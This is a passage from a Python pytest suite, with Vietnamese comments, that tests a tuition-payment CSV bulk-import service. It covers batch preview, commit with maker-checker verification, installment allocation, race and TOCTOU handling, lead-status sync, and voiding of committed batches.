            matched_count=1,
            warned_count=0,
            failed_count=0,
            total_amount=Decimal("1000000"),
            created_by_id=admin_user.id,
        )
        db.add(committed)
        await db.flush()

        p = pis.PreviewResult(
            rows=[],
            matched_count=0,
            warned_count=0,
            failed_count=0,
            total_amount=Decimal("0"),
        )
        with pytest.raises(ConflictError):
            await pis.create_preview_batch(
                db,
                preview=p,
                academic_year=2026,
                semester_no=1,
                file_name="new.csv",
                file_sha256_hex=sha,
                created_by_id=admin_user.id,
            )

    async def test_integrity_error_maps_to_conflict(
        self, db, seeded_dependencies, admin_user, monkeypatch
    ):
        # Test-gap #7: nhánh race 2 upload cùng file lọt pre-check → partial-unique
        # nổ ở flush → service phải rollback + ConflictError (KHÔNG để thành 500).
        # Mô phỏng bằng cách ép flush ném IntegrityError.
        from sqlalchemy.exc import IntegrityError

        async def _boom(*a, **k):
            raise IntegrityError("INSERT", {}, Exception("dup file_sha256"))

        monkeypatch.setattr(db, "flush", _boom)
        p = pis.PreviewResult(
            rows=[],
            matched_count=0,
            warned_count=0,
            failed_count=0,
            total_amount=Decimal("0"),
        )
        with pytest.raises(ConflictError):
            await pis.create_preview_batch(
                db,
                preview=p,
                academic_year=2026,
                semester_no=1,
                file_name="race.csv",
                file_sha256_hex="c" * 64,
                created_by_id=admin_user.id,
            )


# =============================================================================
# BV-3 — ghi tiền (get_system_user / auto_verify_payment / commit_batch)
# =============================================================================
async def _seed_system_user(db):
    from app.security import get_password_hash

    user = models.User(
        username="system",
        email="system@qlts.internal",
        password_hash=get_password_hash("SystemX123!"),
        full_name="System Policy",
        role="user",
        status="inactive",
        unit_id=None,
    )
    db.add(user)
    await db.flush()
    return user


async def _seed_cash_method(db):
    m = PaymentMethod(code="cash", name="Tiền mặt", is_online=False, is_active=True)
    db.add(m)
    await db.flush()
    return m


async def _preview_batch(
    db,
    deps,
    *,
    importer_id,
    citizen_id="001234567890",
    name="Nguyễn Văn An",
    amount="10.000.000",
    invoices=((1, "10000000", "issued", "0", "0"),),
    year=2026,
    semester=1,
):
    """Seed chain + 1 dòng matched + preview_import → batch preview."""
    await _seed_tuition(
        db,
        deps,
        citizen_id=citizen_id,
        lead_name=name,
        invoices=list(invoices),
        year=year,
        semester=semester,
    )
    content = _csv_bytes(
        [pis.TEMPLATE_COLS, [citizen_id, name, amount, "05/09/2026", "TM", "", ""]]
    )
    batch, _ = await pis.preview_import(
        db,
        content=content,
        filename="thu.csv",
        academic_year=year,
        semester_no=semester,
        created_by_id=importer_id,
        unit_id=None,
    )
    return batch


class TestGetSystemUser:
    async def test_returns_seeded(self, db, seeded_dependencies):
        await _seed_system_user(db)
        u = await pis.get_system_user(db)
        assert u.username == "system"

    async def test_missing_raises(self, db, seeded_dependencies):
        with pytest.raises(ConflictError):
            await pis.get_system_user(db)

    async def test_bad_fingerprint_raises(self, db, seeded_dependencies):
        u = await _seed_system_user(db)
        u.status = "active"  # sai fingerprint (phải inactive)
        await db.flush()
        with pytest.raises(ConflictError):
            await pis.get_system_user(db)

    async def test_fingerprint_rejects_non_bcrypt_hash(self, db, seeded_dependencies):
        # Fix #14: fingerprint chặt hơn — password không phải bcrypt thật → từ chối
        u = await _seed_system_user(db)
        u.password_hash = "not-a-bcrypt-hash"
        await db.flush()
        with pytest.raises(ConflictError):
            await pis.get_system_user(db)


class TestCommitBatch:
    async def test_commit_writes_payment(self, db, seeded_dependencies, admin_user):
        sysu = await _seed_system_user(db)
        await _seed_cash_method(db)
        batch = await _preview_batch(db, seeded_dependencies, importer_id=admin_user.id)
        batch_id = batch.id
        sysu_id = sysu.id
        await db.commit()

        result, _cb = await pis.commit_batch(
            db, batch_id=batch_id, importer_id=admin_user.id, unit_id=None
        )
        await db.commit()

        assert result.committed_count == 1
        assert result.payment_count == 1
        assert result.total_amount == Decimal("10000000")

        b = (
            await db.execute(
                select(PaymentImportBatch).where(PaymentImportBatch.id == batch_id)
            )
        ).scalar_one()
        assert b.status == "committed" and b.committed_at is not None

        pay = (await db.execute(select(Payment))).scalars().first()
        assert pay.status == "verified"
        assert pay.created_by_id == admin_user.id
        assert pay.verified_by_id == sysu_id
        assert pay.created_by_id != pay.verified_by_id  # maker-checker

        inv = (await db.execute(select(Invoice))).scalars().first()
        assert inv.paid_amount == Decimal("10000000")
        assert inv.status == "paid"
        fee = (
            (await db.execute(select(Fee).where(Fee.fee_type == "tuition")))
            .scalars()
            .first()
        )
        assert fee.paid_amount == Decimal("10000000")
        assert fee.status == "paid"

        txn = (await db.execute(select(PaymentTransaction))).scalars().first()
        assert txn.idempotency_key.startswith("bulkimport:")
        assert txn.transaction_type == "payment"

        row = (
            await db.execute(
                select(PaymentImportRow).where(PaymentImportRow.batch_id == batch_id)
            )
        ).scalar_one()
        assert row.payment_ids == [pay.id]

    async def test_recommit_rejected(self, db, seeded_dependencies, admin_user):
        await _seed_system_user(db)
        await _seed_cash_method(db)
        batch = await _preview_batch(db, seeded_dependencies, importer_id=admin_user.id)
        batch_id = batch.id
        await db.commit()
        await pis.commit_batch(
            db, batch_id=batch_id, importer_id=admin_user.id, unit_id=None
        )
        await db.commit()
        with pytest.raises(ConflictError):
            await pis.commit_batch(
                db, batch_id=batch_id, importer_id=admin_user.id, unit_id=None
            )

    async def test_importer_is_system_rejected(self, db, seeded_dependencies):
        sysu = await _seed_system_user(db)
        await _seed_cash_method(db)
        batch = await _preview_batch(db, seeded_dependencies, importer_id=sysu.id)
        batch_id = batch.id
        sysu_id = sysu.id
        await db.commit()
        with pytest.raises(BusinessRuleViolation):
            await pis.commit_batch(
                db, batch_id=batch_id, importer_id=sysu_id, unit_id=None
            )

    async def test_toctou_fee_cancelled_skips(
        self, db, seeded_dependencies, admin_user
    ):
        await _seed_system_user(db)
        await _seed_cash_method(db)
        batch = await _preview_batch(db, seeded_dependencies, importer_id=admin_user.id)
        batch_id = batch.id
        # hủy fee giữa preview→commit (TOCTOU)
        fee = (
            (await db.execute(select(Fee).where(Fee.fee_type == "tuition")))
            .scalars()
            .first()
        )
        fee.status = "cancelled"
        await db.commit()

        result, _ = await pis.commit_batch(
            db, batch_id=batch_id, importer_id=admin_user.id, unit_id=None
        )
        await db.commit()

        assert result.committed_count == 0
        assert result.failed_count == 1
        assert result.payment_count == 0
        assert (await db.execute(select(Payment))).scalars().all() == []
        row = (
            await db.execute(
                select(PaymentImportRow).where(PaymentImportRow.batch_id == batch_id)
            )
        ).scalar_one()
        assert row.status == "error"
        assert "cancelled" in (row.message or "")

    async def test_fifo_two_invoices(self, db, seeded_dependencies, admin_user):
        await _seed_system_user(db)
        await _seed_cash_method(db)
        batch = await _preview_batch(
            db,
            seeded_dependencies,
            importer_id=admin_user.id,
            amount="7.000.000",
            invoices=(
                (1, "4000000", "issued", "0", "0"),
                (2, "6000000", "issued", "0", "0"),
            ),
        )
        batch_id = batch.id
        await db.commit()
        result, _ = await pis.commit_batch(
            db, batch_id=batch_id, importer_id=admin_user.id, unit_id=None
        )
        await db.commit()
        assert result.committed_count == 1
        assert result.payment_count == 2  # 4tr (đợt 1) + 3tr (tràn đợt 2)
        assert result.total_amount == Decimal("7000000")
        row = (
            await db.execute(
                select(PaymentImportRow).where(PaymentImportRow.batch_id == batch_id)
            )
        ).scalar_one()
        assert len(row.payment_ids) == 2

    async def test_lead_sync_hk1_cleared(self, db, seeded_dependencies, admin_user):
        from app.services.lead_admission_sync import TUITION_PAID_STATUS

        db.add(
            models.ConsultationStatus(
                id=TUITION_PAID_STATUS,
                name="Đã đóng học phí",
                color_code="#00aa00",
                stage_id="stg01",
            )
        )
        await db.flush()
        await _seed_system_user(db)
        await _seed_cash_method(db)
        batch = await _preview_batch(db, seeded_dependencies, importer_id=admin_user.id)
        batch_id = batch.id
        prof = (await db.execute(select(models.AdmissionProfile))).scalars().first()
        lead_id = prof.lead_id
        await db.commit()

        await pis.commit_batch(
            db, batch_id=batch_id, importer_id=admin_user.id, unit_id=None
        )
        await db.commit()

        lead = (
            await db.execute(select(models.Lead).where(models.Lead.id == lead_id))
        ).scalar_one()
        assert lead.consultation_status_id == TUITION_PAID_STATUS

    async def test_partial_alloc_overpay_not_counted(
        self, db, seeded_dependencies, admin_user
    ):
        # Bug 1: phân-bổ-một-phần-rồi-overpay → savepoint rollback; tổng KHÔNG phình.
        await _seed_system_user(db)
        await _seed_cash_method(db)
        batch = await _preview_batch(
            db,
            seeded_dependencies,
            importer_id=admin_user.id,
            amount="7.000.000",
            invoices=(
                (1, "4000000", "issued", "0", "0"),
                (2, "6000000", "issued", "0", "0"),
            ),
        )
        batch_id = batch.id
        # giữa preview→commit: đợt 2 đã thu đủ ngoài → chỉ còn đợt 1 (4tr) payable
        inv2 = (
            (await db.execute(select(Invoice).where(Invoice.installment_no == 2)))
            .scalars()
            .first()
        )
        inv2.paid_amount = Decimal("6000000")
        inv2.status = "paid"
        await db.commit()

        result, _ = await pis.commit_batch(
            db, batch_id=batch_id, importer_id=admin_user.id, unit_id=None
        )
        await db.commit()

        # 7tr > 4tr còn lại → dòng error, KHÔNG ghi nửa vời + tổng KHÔNG phình
        assert result.committed_count == 0
        assert result.payment_count == 0
        assert result.total_amount == Decimal("0")
        assert (await db.execute(select(Payment))).scalars().all() == []

    async def test_lead_sync_failure_keeps_money(
        self, db, seeded_dependencies, admin_user, monkeypatch
    ):
        # Bug 2: lead-sync raise KHÔNG được hủy tiền đã ghi của cả lô.
        async def _boom(**kwargs):
            raise RuntimeError("lead sync boom")

        monkeypatch.setattr(
            "app.services.lead_admission_sync.sync_lead_tuition_paid", _boom
        )
        await _seed_system_user(db)
        await _seed_cash_method(db)
        batch = await _preview_batch(db, seeded_dependencies, importer_id=admin_user.id)
        batch_id = batch.id
        await db.commit()

        result, _ = await pis.commit_batch(
            db, batch_id=batch_id, importer_id=admin_user.id, unit_id=None
        )
        await db.commit()

        # tiền vẫn ghi dù lead-sync nổ
        assert result.payment_count == 1
        pay = (await db.execute(select(Payment))).scalars().first()
        assert pay is not None and pay.status == "verified"
        b = (
            await db.execute(
                select(PaymentImportBatch).where(PaymentImportBatch.id == batch_id)
            )
        ).scalar_one()
        assert b.status == "committed"

    async def test_unexpected_error_shows_generic_message(
        self, db, seeded_dependencies, admin_user, monkeypatch
    ):
        # Lỗi KHÔNG lường khi ghi 1 dòng (vd asyncpg/IntegrityError) → message generic
        # thân thiện + KHÔNG dump SQLAlchemy/asyncpg cho kế toán; savepoint cô lập dòng.
        await _seed_system_user(db)
        await _seed_cash_method(db)
        batch = await _preview_batch(db, seeded_dependencies, importer_id=admin_user.id)
        batch_id = batch.id
        await db.commit()

        async def _boom(*args, **kwargs):
            raise RuntimeError("asyncpg.ForeignKeyViolationError: detail")

        monkeypatch.setattr(pis, "auto_verify_payment", _boom)

        result, _ = await pis.commit_batch(
            db, batch_id=batch_id, importer_id=admin_user.id, unit_id=None
        )
        await db.commit()

        assert result.committed_count == 0
        assert result.failed_count == 1
        row = (
            await db.execute(
                select(PaymentImportRow).where(PaymentImportRow.batch_id == batch_id)
            )
        ).scalar_one()
        assert row.status == "error"
        assert row.message == (
            "lỗi hệ thống khi ghi dòng này — vui lòng liên hệ kỹ thuật"
        )
        # KHÔNG lộ chi tiết kỹ thuật cho kế toán
        assert "asyncpg" not in row.message
        assert "ForeignKeyViolation" not in row.message
        # lô fail-toàn-bộ → giữ 'preview' (re-import được, không poison)
        b = (
            await db.execute(
                select(PaymentImportBatch).where(PaymentImportBatch.id == batch_id)
            )
        ).scalar_one()
        assert b.status == "preview"

    async def test_cross_unit_creator_rejected(
        self, db, seeded_dependencies, second_unit, officer_user, admin_user
    ):
        # P1 #1: committer khác đơn vị người tạo lô → 404 (không poison lô đơn vị khác).
        await _seed_system_user(db)
        await _seed_cash_method(db)
        batch = await _preview_batch(
            db, seeded_dependencies, importer_id=officer_user.id
        )  # officer_user unit 1001
        batch_id = batch.id
        await db.commit()
        with pytest.raises(ResourceNotFoundError):
            await pis.commit_batch(
                db,
                batch_id=batch_id,
                importer_id=admin_user.id,
                unit_id=second_unit.id,  # unit 2001 ≠ creator unit 1001
            )
        b = (
            await db.execute(
                select(PaymentImportBatch).where(PaymentImportBatch.id == batch_id)
            )
        ).scalar_one()
        assert b.status == "preview"  # không bị poison

    async def test_all_rows_fail_keeps_preview_and_counters(
        self, db, seeded_dependencies, admin_user
    ):
        # Fix #4 + #1: lô commit fail-TOÀN-BỘ → GIỮ 'preview' (không khóa file) +
        # counter/total recompute về số THỰC (0), không giữ overstate preview.
        await _seed_system_user(db)
        await _seed_cash_method(db)
        batch = await _preview_batch(
            db, seeded_dependencies, importer_id=admin_user.id
        )
        batch_id = batch.id
        # hủy fee giữa preview→commit → dòng (matched ở preview) fail lúc commit
        fee = (
            (await db.execute(select(Fee).where(Fee.fee_type == "tuition")))
            .scalars()
            .first()
        )
        fee.status = "cancelled"
        await db.commit()

        result, _ = await pis.commit_batch(
            db, batch_id=batch_id, importer_id=admin_user.id, unit_id=None
        )
        await db.commit()
        assert result.committed_count == 0
        b = (
            await db.execute(
                select(PaymentImportBatch).where(PaymentImportBatch.id == batch_id)
            )
        ).scalar_one()
        assert b.status == "preview"  # KHÔNG khóa file (re-import được)
        assert b.total_amount == Decimal("0")  # không giữ số preview overstate
        assert b.matched_count == 0
        assert b.failed_count == 1

    async def test_committed_counters_reflect_actual_writes(
        self, db, seeded_dependencies, admin_user
    ):
        # Fix #1: 2 đợt, commit thành công → total_amount/counter của batch = tiền THỰC
        await _seed_system_user(db)
        await _seed_cash_method(db)
        batch = await _preview_batch(
            db,
            seeded_dependencies,
            importer_id=admin_user.id,
            amount="7.000.000",
            invoices=(
                (1, "4000000", "issued", "0", "0"),
                (2, "6000000", "issued", "0", "0"),
            ),
        )
        batch_id = batch.id
        await db.commit()
        await pis.commit_batch(
            db, batch_id=batch_id, importer_id=admin_user.id, unit_id=None
        )
        await db.commit()
        b = (
            await db.execute(
                select(PaymentImportBatch).where(PaymentImportBatch.id == batch_id)
            )
        ).scalar_one()
        assert b.status == "committed"
        assert b.total_amount == Decimal("7000000")  # tiền thực ghi
        assert b.failed_count == 0

    async def test_reference_dangerous_prefix_committed_clean(
        self, db, seeded_dependencies, admin_user
    ):
        # Fix #3: mã tham chiếu bắt đầu '-' ghi vào Payment SẠCH (không có dấu ' đầu)
        await _seed_system_user(db)
        await _seed_cash_method(db)
        await _seed_tuition(
            db,
            seeded_dependencies,
            citizen_id="001234567890",
            invoices=[(1, "10000000", "issued", "0", "0")],
        )
        content = _csv_bytes(
            [
                pis.TEMPLATE_COLS,
                [
                    "001234567890",
                    "Nguyễn Văn An",
                    "10.000.000",
                    "05/09/2026",
                    "TM",
                    "-PT-2026-001",
                    "",
                ],
            ]
        )
        batch, _ = await pis.preview_import(
            db,
            content=content,
            filename="thu.csv",
            academic_year=2026,
            semester_no=1,
            created_by_id=admin_user.id,
            unit_id=None,
        )
        batch_id = batch.id
        await db.commit()
        await pis.commit_batch(
            db, batch_id=batch_id, importer_id=admin_user.id, unit_id=None
        )
        await db.commit()
        pay = (await db.execute(select(Payment))).scalars().first()
        assert pay.reference_code == "-PT-2026-001"  # KHÔNG có dấu ' đầu


class TestVoidBatch:
    async def _commit_one(self, db, deps, importer_id):
        await _seed_system_user(db)
        await _seed_cash_method(db)
        batch = await _preview_batch(db, deps, importer_id=importer_id)
        batch_id = batch.id
        await db.commit()
        await pis.commit_batch(
            db, batch_id=batch_id, importer_id=importer_id, unit_id=None
        )
        await db.commit()
        return batch_id

    async def _seed_sts10(self, db):
        from app.services.lead_admission_sync import TUITION_PAID_STATUS

        db.add(
            models.ConsultationStatus(
                id=TUITION_PAID_STATUS,
                name="Đã đóng học phí",
                color_code="#00aa00",
                stage_id="stg01",
            )
        )
        await db.flush()
        return TUITION_PAID_STATUS

    async def test_void_reverts_lead_from_sts10(
        self, db, seeded_dependencies, admin_user
    ):
        # Void lô đã đẩy lead sts10 → LÙI lead về status TRƯỚC (đối xứng forward sync).
        sts10 = await self._seed_sts10(db)
        await _seed_system_user(db)
        await _seed_cash_method(db)
        batch = await _preview_batch(db, seeded_dependencies, importer_id=admin_user.id)
        batch_id = batch.id
        prof = (await db.execute(select(models.AdmissionProfile))).scalars().first()
        lead_id = prof.lead_id
        orig = seeded_dependencies["initial_status_id"]
        await db.commit()

        await pis.commit_batch(
            db, batch_id=batch_id, importer_id=admin_user.id, unit_id=None
        )
        await db.commit()
        lead = (
            await db.execute(select(models.Lead).where(models.Lead.id == lead_id))
        ).scalar_one()
        assert lead.consultation_status_id == sts10  # tiền đề: forward đẩy sts10

        await pis.void_batch(
            db, batch_id=batch_id, user_id=admin_user.id, unit_id=None,
            reason="ghi nhầm lô",
        )
        await db.commit()
        lead2 = (
            await db.execute(select(models.Lead).where(models.Lead.id == lead_id))
        ).scalar_one()
        assert lead2.consultation_status_id == orig  # đã lùi về status cũ
        # có bản ghi history audit cho lần lùi (sts10 → orig)
        hist = (
            (
                await db.execute(
                    select(models.LeadStatusHistory).where(
                        models.LeadStatusHistory.lead_id == lead_id,
                        models.LeadStatusHistory.old_consultation_status_id == sts10,
                        models.LeadStatusHistory.new_consultation_status_id == orig,
                    )
                )
            )
            .scalars()
            .all()
        )
        assert len(hist) >= 1

    async def test_void_partial_combo_reverts_lead_off_sts10(
        self, db, seeded_dependencies, admin_user
    ):
        """Combo manual + import: void lô import để lại remaining>0 → LÙI lead.

        Khoá hành vi MỚI (is_hk1_settled, partial != settled): một fee HK1
        được tất toán bởi CẢ một khoản thu tay (4tr) LẪN một lô import (6tr)
        → settled → forward sync đẩy lead sts10. Void RIÊNG lô import (6tr)
        để fee còn remaining 6tr (khoản tay giữ lại) → KHÔNG còn settled →
        void_batch fall-through → revert lead KHỎI sts10.

        Trước đây is_hk1_cleared coi (partial + paid>0) = cleared nên `continue`
        GIỮ lead ở sts10 dù còn nợ — nay đã sửa cho đúng contract.
        """
        sts10 = await self._seed_sts10(db)
        await _seed_system_user(db)
        await _seed_cash_method(db)

        cccd = "001999888777"
        # Fee 10tr, invoice đã có khoản thu TAY 4tr (partial); fee.paid khớp.
        prof, fee, _invs = await _seed_tuition(
            db, seeded_dependencies, citizen_id=cccd,
            invoices=[(1, "10000000", "partial", "4000000", "0")],
        )
        fee.paid_amount = Decimal("4000000")
        fee.status = "partial"
        await db.flush()
        lead_id = prof.lead_id
        orig = seeded_dependencies["initial_status_id"]
        await db.commit()

        # Import lô thu nốt 6tr → fee settled (remaining 0) → forward sync sts10.
        content = _csv_bytes(
            [pis.TEMPLATE_COLS, [cccd, "Nguyễn Văn An", "6.000.000",
                                 "05/09/2026", "TM", "", ""]]
        )
        batch, _ = await pis.preview_import(
            db, content=content, filename="thu.csv",
            academic_year=2026, semester_no=1,
            created_by_id=admin_user.id, unit_id=None,
        )
        batch_id = batch.id
        await db.commit()
        await pis.commit_batch(
            db, batch_id=batch_id, importer_id=admin_user.id, unit_id=None
        )
        await db.commit()
        lead = (
            await db.execute(select(models.Lead).where(models.Lead.id == lead_id))
        ).scalar_one()
        assert lead.consultation_status_id == sts10  # tiền đề: settled → sts10

        # Void RIÊNG lô import → fee còn remaining 6tr (khoản tay) → revert.
        await pis.void_batch(
            db, batch_id=batch_id, user_id=admin_user.id, unit_id=None,
            reason="ghi nhầm lô import",
        )
        await db.commit()
        lead2 = (
            await db.execute(select(models.Lead).where(models.Lead.id == lead_id))
        ).scalar_one()
        assert lead2.consultation_status_id == orig, (
            "fee còn remaining sau void → partial != settled → lead phải LÙI "
            f"khỏi sts10, got {lead2.consultation_status_id}"
        )

    async def test_void_skips_lead_revert_when_advanced_past_sts10(
        self, db, seeded_dependencies, admin_user
    ):
        # Lead đã chuyển tiếp khỏi sts10 (nhập học) → void KHÔNG kéo lùi pipeline.
        sts10 = await self._seed_sts10(db)
        db.add(
            models.ConsultationStatus(
                id="stsZZ", name="Đã nhập học", color_code="#123456",
                stage_id="stg01",
            )
        )
        await db.flush()
        await _seed_system_user(db)
        await _seed_cash_method(db)
        batch = await _preview_batch(db, seeded_dependencies, importer_id=admin_user.id)
        batch_id = batch.id
        prof = (await db.execute(select(models.AdmissionProfile))).scalars().first()
        lead_id = prof.lead_id
        await db.commit()
        await pis.commit_batch(
            db, batch_id=batch_id, importer_id=admin_user.id, unit_id=None
        )
        await db.commit()
        lead = (
            await db.execute(select(models.Lead).where(models.Lead.id == lead_id))
        ).scalar_one()
        assert lead.consultation_status_id == sts10
        lead.consultation_status_id = "stsZZ"  # giả lập chuyển tiếp sau khi đóng HP
        await db.commit()

        await pis.void_batch(
            db, batch_id=batch_id, user_id=admin_user.id, unit_id=None, reason="x",
        )
        await db.commit()
        lead2 = (
            await db.execute(select(models.Lead).where(models.Lead.id == lead_id))
        ).scalar_one()
        assert lead2.consultation_status_id == "stsZZ"  # KHÔNG bị kéo lùi

    async def test_void_hk2_does_not_touch_lead(
        self, db, seeded_dependencies, admin_user
    ):
        # batch HK2 → commit/void KHÔNG đụng pipeline lead (chỉ HK1 đẩy/lùi).
        await self._seed_sts10(db)
        await _seed_system_user(db)
        await _seed_cash_method(db)
        batch = await _preview_batch(
            db, seeded_dependencies, importer_id=admin_user.id, semester=2
        )
        batch_id = batch.id
        prof = (await db.execute(select(models.AdmissionProfile))).scalars().first()
        lead_id = prof.lead_id
        orig = seeded_dependencies["initial_status_id"]
        await db.commit()
        cres, _ = await pis.commit_batch(
            db, batch_id=batch_id, importer_id=admin_user.id, unit_id=None
        )
        await db.commit()
        assert cres.payment_count == 1  # HK2 batch THỰC ghi tiền (test không rỗng)
        lead = (
            await db.execute(select(models.Lead).where(models.Lead.id == lead_id))
        ).scalar_one()
        assert lead.consultation_status_id == orig  # HK2 → KHÔNG forward sts10

        await pis.void_batch(
            db, batch_id=batch_id, user_id=admin_user.id, unit_id=None, reason="x",
        )
        await db.commit()
        lead2 = (
            await db.execute(select(models.Lead).where(models.Lead.id == lead_id))
        ).scalar_one()
        assert lead2.consultation_status_id == orig  # void HK2 → KHÔNG revert

    async def test_void_money_reversed_even_if_lead_revert_flush_fails(
        self, db, seeded_dependencies, admin_user, monkeypatch
    ):
        # C1 regression: revert chạy db.flush() (cuốn pending đảo tiền vào savepoint
        # của nó) RỒI lỗi → việc đảo tiền KHÔNG được cuốn theo, vì void đã flush đảo
        # tiền NGOÀI savepoint trước vòng revert. (Không fix → tiền sẽ rollback theo.)
        await self._seed_sts10(db)
        await _seed_system_user(db)
        await _seed_cash_method(db)
        batch = await _preview_batch(db, seeded_dependencies, importer_id=admin_user.id)
        batch_id = batch.id
        await db.commit()
        await pis.commit_batch(
            db, batch_id=batch_id, importer_id=admin_user.id, unit_id=None
        )
        await db.commit()

        async def _flush_then_boom(*, db, profile, **kwargs):
            await db.flush()  # cuốn pending đảo tiền vào savepoint của revert
            raise RuntimeError("revert boom sau flush")

        monkeypatch.setattr(
            "app.services.lead_admission_sync.revert_lead_tuition_paid",
            _flush_then_boom,
        )
        result, _ = await pis.void_batch(
            db, batch_id=batch_id, user_id=admin_user.id, unit_id=None, reason="x",
        )
        await db.commit()

        # tiền VẪN đảo dù revert flush-rồi-lỗi
        assert result.reversed_count == 1
        pay = (await db.execute(select(Payment))).scalars().first()
        assert pay.status == "refunded"
        inv = (await db.execute(select(Invoice))).scalars().first()
        assert inv.paid_amount == Decimal("0")
        b = (
            await db.execute(
                select(PaymentImportBatch).where(PaymentImportBatch.id == batch_id)
            )
        ).scalar_one()
        assert b.status == "void"

    async def test_void_reverses_payment(self, db, seeded_dependencies, admin_user):
        # §10 Void: đảo lô → trừ lại paid_amount, reverse transaction, recompute status
        batch_id = await self._commit_one(db, seeded_dependencies, admin_user.id)
        result, _cb = await pis.void_batch(
            db, batch_id=batch_id, user_id=admin_user.id, unit_id=None,
            reason="nhập sai hồ sơ",
        )
        await db.commit()

        assert result.reversed_count == 1
        assert result.reversed_amount == Decimal("10000000")
        b = (
            await db.execute(
                select(PaymentImportBatch).where(PaymentImportBatch.id == batch_id)
            )
        ).scalar_one()
        assert b.status == "void" and b.voided_at is not None
        assert b.void_reason == "nhập sai hồ sơ"

        pay = (await db.execute(select(Payment))).scalars().first()
        assert pay.status == "refunded"  # rút lại → loại khỏi sum verified
        inv = (await db.execute(select(Invoice))).scalars().first()
        assert inv.paid_amount == Decimal("0")
        assert inv.status == "issued"  # mở lại để thu tiếp
        fee = (
            (await db.execute(select(Fee).where(Fee.fee_type == "tuition")))
            .scalars()
            .first()
        )
        assert fee.paid_amount == Decimal("0")
        assert fee.status == "invoiced"

        rev = (
            (
                await db.execute(
                    select(PaymentTransaction).where(
                        PaymentTransaction.transaction_type == "reversal"
                    )
                )
            )
            .scalars()
            .first()
        )
        assert rev is not None
        assert rev.amount == Decimal("-10000000")  # âm
        assert rev.idempotency_key == f"bulkvoid:{batch_id}:{pay.id}"

    async def test_void_only_committed_batch(
        self, db, seeded_dependencies, admin_user
    ):
        # Lô 'preview' (chưa commit) → KHÔNG void được
        await _seed_system_user(db)
        await _seed_cash_method(db)
        batch = await _preview_batch(
            db, seeded_dependencies, importer_id=admin_user.id
        )
        batch_id = batch.id
        await db.commit()
        with pytest.raises(ConflictError):
            await pis.void_batch(
                db, batch_id=batch_id, user_id=admin_user.id, unit_id=None, reason="x"
            )

    async def test_revoid_rejected(self, db, seeded_dependencies, admin_user):
        # void 2 lần → lần 2 ConflictError (status=void ≠ committed)
        batch_id = await self._commit_one(db, seeded_dependencies, admin_user.id)
        await pis.void_batch(
            db, batch_id=batch_id, user_id=admin_user.id, unit_id=None, reason="x"
        )
        await db.commit()
        with pytest.raises(ConflictError):
            await pis.void_batch(
                db, batch_id=batch_id, user_id=admin_user.id, unit_id=None, reason="x"
            )

    async def test_void_frees_file_for_reimport(
        self, db, seeded_dependencies, admin_user
    ):
        # Sau void, file_sha256 thoát partial-unique → re-import tạo batch MỚI
        await _seed_system_user(db)
        await _seed_cash_method(db)
        cid = "001234567890"
        await _seed_tuition(
            db,
            seeded_dependencies,
            citizen_id=cid,
            invoices=[(1, "10000000", "issued", "0", "0")],
        )
        content = _csv_bytes(
            [
                pis.TEMPLATE_COLS,
                [cid, "Nguyễn Văn An", "10.000.000", "05/09/2026", "TM", "", ""],
            ]
        )
        b1, _ = await pis.preview_import(
            db, content=content, filename="thu.csv", academic_year=2026,
            semester_no=1, created_by_id=admin_user.id, unit_id=None,
        )
        b1_id = b1.id
        await db.commit()
        await pis.commit_batch(
            db, batch_id=b1_id, importer_id=admin_user.id, unit_id=None
        )
        await db.commit()
        await pis.void_batch(
            db, batch_id=b1_id, user_id=admin_user.id, unit_id=None, reason="x"
        )
        await db.commit()
        # re-import cùng file → KHÔNG ConflictError (batch cũ đã void) → batch mới
        b2, _ = await pis.preview_import(
            db, content=content, filename="thu.csv", academic_year=2026,
            semester_no=1, created_by_id=admin_user.id, unit_id=None,
        )
        await db.commit()
        assert b2.id != b1_id

    async def test_void_cross_unit_rejected(
        self, db, seeded_dependencies, second_unit, officer_user, admin_user
    ):
        # manager đơn vị khác void lô đơn vị 1001 → 404 (không poison)
        await _seed_system_user(db)
        await _seed_cash_method(db)
        batch = await _preview_batch(
            db, seeded_dependencies, importer_id=officer_user.id
        )  # creator unit 1001
        batch_id = batch.id
        await db.commit()
        await pis.commit_batch(
            db, batch_id=batch_id, importer_id=admin_user.id, unit_id=None
        )
        await db.commit()
        with pytest.raises(ResourceNotFoundError):
            await pis.void_batch(
                db, batch_id=batch_id, user_id=admin_user.id,
                unit_id=second_unit.id, reason="x",
            )
        b = (
            await db.execute(
                select(PaymentImportBatch).where(PaymentImportBatch.id == batch_id)
            )
        ).scalar_one()
        assert b.status == "committed"  # không bị void nhầm

    async def test_void_partial_paid_invoice(
        self, db, seeded_dependencies, admin_user
    ):
        # #9: nhánh 'partial' của reverse — invoice còn paid khác sau khi đảo bulk
        await _seed_system_user(db)
        await _seed_cash_method(db)
        await _seed_tuition(
            db,
            seeded_dependencies,
            citizen_id="001234567890",
            invoices=[(1, "10000000", "partial", "4000000", "0")],  # đã trả 4tr trước
        )
        content = _csv_bytes(
            [
                pis.TEMPLATE_COLS,
                ["001234567890", "Nguyễn Văn An", "6.000.000", "05/09/2026", "TM",
                 "", ""],
            ]
        )
        batch, _ = await pis.preview_import(
            db, content=content, filename="thu.csv", academic_year=2026,
            semester_no=1, created_by_id=admin_user.id, unit_id=None,
        )
        bid = batch.id
        await db.commit()
        await pis.commit_batch(
            db, batch_id=bid, importer_id=admin_user.id, unit_id=None
        )
        await db.commit()  # invoice paid = 10tr (paid)
        await pis.void_batch(
            db, batch_id=bid, user_id=admin_user.id, unit_id=None, reason="x"
        )
        await db.commit()
        inv = (await db.execute(select(Invoice))).scalars().first()
        assert inv.paid_amount == Decimal("4000000")  # còn 4tr (paid trước, KHÔNG đảo)
        assert inv.status == "partial"  # nhánh partial, KHÔNG về issued

    async def test_void_multi_invoice(self, db, seeded_dependencies, admin_user):
        # #10: 1 dòng trải 2 đợt → 2 payment → void đảo cả 2 (cumulative trên 1 fee)
        await _seed_system_user(db)
        await _seed_cash_method(db)
        batch = await _preview_batch(
            db, seeded_dependencies, importer_id=admin_user.id, amount="7.000.000",
            invoices=(
                (1, "4000000", "issued", "0", "0"),
                (2, "6000000", "issued", "0", "0"),
            ),
        )
        bid = batch.id
        await db.commit()
        await pis.commit_batch(
            db, batch_id=bid, importer_id=admin_user.id, unit_id=None
        )
        await db.commit()
        result, _ = await pis.void_batch(
            db, batch_id=bid, user_id=admin_user.id, unit_id=None, reason="x"
        )
        await db.commit()
        assert result.reversed_count == 2
        assert result.reversed_amount == Decimal("7000000")
        invs = (
            (await db.execute(select(Invoice).order_by(Invoice.installment_no)))
            .scalars()
            .all()
        )
